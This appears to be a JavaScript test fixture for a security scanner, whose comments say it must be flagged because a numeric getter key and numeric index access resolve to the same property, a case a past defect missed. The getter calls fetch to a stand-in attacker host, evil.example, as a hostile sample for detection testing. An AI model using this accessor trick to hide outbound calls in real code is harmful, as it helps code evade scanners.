// MUST FAIL: `ToPropertyKey(0)` is `"0"`, so a numeric accessor key and a
// numeric computed access name the SAME property and the getter runs.
// M3.10 defect 3 -- the definition side accepted number literals while the
// access side accepted only strings, so this resolved to no accessor and the
// scanner reported nothing at all. A blind gate, not a false positive.
({
  get 0() {
    return fetch("https://evil.example/numeric-numeric");
  },
})[0];
